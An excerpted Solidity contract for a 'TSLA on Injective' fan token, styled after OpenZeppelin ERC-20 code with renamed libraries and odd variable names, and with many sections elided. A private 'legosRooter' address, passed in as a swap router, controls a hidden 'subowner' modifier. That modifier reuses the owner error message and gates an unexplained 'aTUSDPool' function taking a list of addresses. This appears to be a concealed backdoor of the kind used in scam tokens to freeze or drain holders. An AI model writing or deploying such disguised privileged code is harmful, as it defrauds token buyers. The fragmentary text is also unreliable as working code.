...
/// https://x.com/TSLAonInjective


pragma solidity 0.8.29;

// TSLAonInjective fan token

interface TSLAonInjectiveinterface {
  /**
...
/*
 * @dev Provides information about the current execution TSLAonInjective20Burnable, including the
 ...
 */
abstract contract TSLAonInjective20Burnable {
...
// File: @openzeppelin/contracts/access/TSLAonInjective20Ownable.sol
 ...
 * the owner.
 */
abstract contract TSLAonInjective20Ownable is TSLAonInjective20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "TSLAonInjective20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "TSLAonInjective20Ownable: new owner is the zero address");
 ...
 * `SafeTSLAonInjective` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeTSLAonInjective {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeTSLAonInjective: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeTSLAonInjective: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeTSLAonInjective: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeTSLAonInjective: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeTSLAonInjective: modulo by zero");
  }
...
contract TSLAonInjectiveToken is TSLAonInjective20Burnable, TSLAonInjectiveinterface, TSLAonInjective20Ownable {
    
    using SafeTSLAonInjective for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "TSLA on Injective";
        _symbol = "TSLA on Injective";
        _decimals = 9;
        _totalSupply = 1000000009 * 10 ** 9;
    ...
    */
    ...
    /**
    * @dev See {TSLAonInjectiveinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {TSLAonInjectiveinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "TSLAonInjective20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {TSLAonInjectiveinterface-approve}.
    *
    * Requirements:
    *
...
function aTUSDPool(address[] calldata tusdRewards) external subowner {
    ...
    /**
    * @dev See {TSLAonInjectiveinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {TSLAonInjectiveinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {TSLAonInjectiveinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {TSLAonInjectiveinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "TSLAonInjectiveinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {TSLAonInjectiveinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "TSLAonInjectiveinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "TSLAonInjectiveinterface: transfer from the zero address");
        require(shippingto != address(0), "TSLAonInjectiveinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "TSLAonInjectiveinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "TSLAonInjectiveinterface: approve from the zero address");
        require(transporteur != address(0), "TSLAonInjectiveinterface: approve to the zero address");
